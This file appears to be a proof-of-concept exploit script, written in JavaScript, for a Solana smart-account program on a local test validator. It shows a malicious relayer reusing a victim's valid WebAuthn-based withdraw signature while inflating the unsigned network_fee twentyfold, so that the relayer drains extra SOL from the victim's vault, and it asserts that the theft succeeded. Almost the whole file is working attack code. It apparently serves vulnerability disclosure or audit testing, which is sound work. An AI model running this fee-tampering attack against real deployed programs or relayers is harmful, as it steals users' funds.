// ANT-860 PoC-B (B2): V3 fee tamper — valid V3 sig, relayer alters network_fee.
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction, TransactionInstruction, LAMPORTS_PER_SOL } from "@solana/web3.js";
const PROGRAM = new PublicKey("4KLMwD1EHjkFPf3DUSeJn55Co529matzUVv2yrpvPC8a");
const SECP = new PublicKey("Secp256r1SigVerify1111111111111111111111111");
const INSTRUCTIONS = new PublicKey("Sysvar1nstructions1111111111111111111111111");
const DOMAIN_V3 = Buffer.from("PID|SOLANA|SMART_ACCOUNT|v3");
const AUTH_PREFIX = crypto.createHash("sha256").update("test-rp").digest();
const N = BigInt("0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551");
const POLICY_V1 = 1;
const conn = new Connection("http://127.0.0.1:18999", "confirmed");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const b64url = (b) => Buffer.from(b).toString("base64url");
const pidToSeed32 = (pid) => sha256(Buffer.from(pid.trim().toLowerCase(), "utf8"));
const [TREASURY_PDA] = PublicKey.findProgramAddressSync([Buffer.from("treasury")], PROGRAM);
function lowS(sig) { const r = BigInt("0x" + sig.subarray(0, 32).toString("hex")); let s = BigInt("0x" + sig.subarray(32).toString("hex")); if (s > N / 2n) s = N - s; const b = Buffer.alloc(64); Buffer.from(r.toString(16).padStart(64, "0"), "hex").copy(b, 0); Buffer.from(s.toString(16).padStart(64, "0"), "hex").copy(b, 32); return b; }
function compressedPub(pub) { const der = pub.export({ format: "der", type: "spki" }); const raw = der.subarray(der.length - 65); const X = raw.subarray(1, 33); return Buffer.concat([Buffer.from([(raw[64] & 1) ? 0x03 : 0x02]), X]); }
function authData() { return Buffer.concat([AUTH_PREFIX, Buffer.from([0x05]), Buffer.from([0, 0, 0, 1])]); }
function signPayload(kp, payloadHash) {
  const clientDataJSON = Buffer.from(JSON.stringify({ type: "webauthn.get", challenge: b64url(payloadHash), origin: "test.invalid" }));
  const messageData = Buffer.concat([authData(), sha256(clientDataJSON)]);
  const sig = lowS(crypto.sign("sha256", messageData, { key: kp.privateKey, dsaEncoding: "ieee-p1363" }));
  return { clientDataJSON, messageData, sig, comp: compressedPub(kp.publicKey) };
}
function buildSecpIx(pubkeyComp, sigRaw, messageData) { const o = Buffer.alloc(14); o.writeUInt16LE(49, 0); o.writeUInt16LE(0xffff, 2); o.writeUInt16LE(16, 4); o.writeUInt16LE(0xffff, 6); o.writeUInt16LE(113, 8); o.writeUInt16LE(messageData.length, 10); o.writeUInt16LE(0xffff, 12); return new TransactionInstruction({ keys: [], programId: SECP, data: Buffer.concat([Buffer.from([1, 0]), o, pubkeyComp, sigRaw, messageData]) }); }
const u64 = (v) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; };
const i64 = (v) => { const b = Buffer.alloc(8); b.writeBigInt64LE(BigInt(v)); return b; };
const u16 = (v) => { const b = Buffer.alloc(2); b.writeUInt16LE(v); return b; };
const liveNow = async () => conn.getBlockTime(await conn.getSlot());

// victim account with 2 SOL
const kV = crypto.generateKeyPairSync("ec", { namedCurve: "prime256v1" });
const authV = compressedPub(kV.publicKey);
const payer = Keypair.generate(); const evilRelayer = Keypair.generate(); const userDest = Keypair.generate();
await conn.confirmTransaction(await conn.requestAirdrop(payer.publicKey, 10e9), "confirmed");
await conn.confirmTransaction(await conn.requestAirdrop(evilRelayer.publicKey, 1e9), "confirmed");
const pid = pidToSeed32("pocfee@pid");
const [pda] = PublicKey.findProgramAddressSync([Buffer.from("peridot_id"), Buffer.from("account"), pid], PROGRAM);
{
  const exp = await liveNow().then(t => t + 300);
  const h = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([5]), pid, authV, u16(POLICY_V1), i64(exp)]));
  const s = signPayload(kV, h);
  await conn.confirmTransaction(await sendAndConfirmTransaction(conn, new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: payer.publicKey, isSigner: true, isWritable: true }, { pubkey: pda, isSigner: false, isWritable: true }, { pubkey: TREASURY_PDA, isSigner: false, isWritable: true }, { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: Buffer.concat([Buffer.from([5]), pid, authV, u16(POLICY_V1), i64(exp), u64(0n), u16(s.clientDataJSON.length), s.clientDataJSON]) }), buildSecpIx(s.comp, s.sig, s.messageData)), [payer], { commitment: "confirmed", skipPreflight: true }), "confirmed");
  await conn.confirmTransaction(await sendAndConfirmTransaction(conn, new Transaction().add(SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: pda, lamports: 2 * LAMPORTS_PER_SOL })), [payer], { commitment: "confirmed" }), "confirmed");
  console.log("vault funded:", (await conn.getAccountInfo(pda)).lamports);
}
// victim signs V3 withdraw intent: amount 0.5 SOL, policy v1. network_fee NOT in payload.
const AMOUNT = BigInt(0.5 * LAMPORTS_PER_SOL);
const exp = await liveNow().then(t => t + 300);
const destBytes = userDest.publicKey.toBuffer();
const payload = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([1]), pid, u64(0n), u64(AMOUNT), destBytes, i64(exp), u16(POLICY_V1)]));
const s = signPayload(kV, payload);
const mkWithdraw = (netFee) => new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: pda, isSigner: false, isWritable: true }, { pubkey: userDest.publicKey, isSigner: false, isWritable: true }, { pubkey: TREASURY_PDA, isSigner: false, isWritable: true }, { pubkey: evilRelayer.publicKey, isSigner: true, isWritable: true }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: Buffer.concat([Buffer.from([1]), u64(0n), u64(AMOUNT), destBytes, i64(exp), u16(POLICY_V1), u64(netFee), u16(s.clientDataJSON.length), s.clientDataJSON]) }), buildSecpIx(s.comp, s.sig, s.messageData));
// honest fee baseline: 100k => total 150k (relayer 100k + protocol 50k)
const beforePDA = (await conn.getAccountInfo(pda)).lamports;
const relayerBefore = (await conn.getAccountInfo(evilRelayer.publicKey)).lamports;
// TAMPER: same assertion, network_fee inflated 20x to 2_000_000 (total 3M, well above user intent)
const EVIL_FEE = 2_000_000n;
await sendAndConfirmTransaction(conn, mkWithdraw(EVIL_FEE), [evilRelayer], { commitment: "confirmed", skipPreflight: true });
const afterPDA = (await conn.getAccountInfo(pda)).lamports;
const relayerAfter = (await conn.getAccountInfo(evilRelayer.publicKey)).lamports;
const drained = BigInt(beforePDA) - BigInt(afterPDA);
console.log("TAMPER-OK same-sig inflated fee accepted; PDA drained:", drained.toString(), "(intent amount+honest fee:", (AMOUNT + 150000n).toString() + ")");
console.log("relayer net gain:", BigInt(relayerAfter) - BigInt(relayerBefore), "(attested fee was", EVIL_FEE.toString() + ")");
assert.ok(drained > AMOUNT + 150000n, "extra SOL extracted beyond user intent");
console.log("POC-B DONE: V3 network_fee tamper TERBUKTI — valid assertion settles with altered fee");
// bound probe: absurd fee must hit rent floor
try {
  const exp2 = await liveNow().then(t => t + 300);
  const p2 = sha256(Buffer.concat([DOMAIN_V3, Buffer.from([1]), pid, u64(1n), u64(1000n), destBytes, i64(exp2), u16(POLICY_V1)]));
  const s2 = signPayload(kV, p2);
  const tx = new Transaction().add(new TransactionInstruction({ keys: [{ pubkey: pda, isSigner: false, isWritable: true }, { pubkey: userDest.publicKey, isSigner: false, isWritable: true }, { pubkey: TREASURY_PDA, isSigner: false, isWritable: true }, { pubkey: evilRelayer.publicKey, isSigner: true, isWritable: true }, { pubkey: INSTRUCTIONS, isSigner: false, isWritable: false }], programId: PROGRAM, data: Buffer.concat([Buffer.from([1]), u64(1n), u64(1000n), destBytes, i64(exp2), u16(POLICY_V1), u64(1_000_000_000_000n), u16(s2.clientDataJSON.length), s2.clientDataJSON]) }), buildSecpIx(s2.comp, s2.sig, s2.messageData));
  await sendAndConfirmTransaction(conn, tx, [evilRelayer], { commitment: "confirmed", skipPreflight: true });
  console.log("BOUND-PROBE: absurd fee ACCEPTED (unexpected)");
} catch (e) { console.log("BOUND-PROBE: absurd fee rejected as expected:", (e.message || "").slice(0, 120)); }
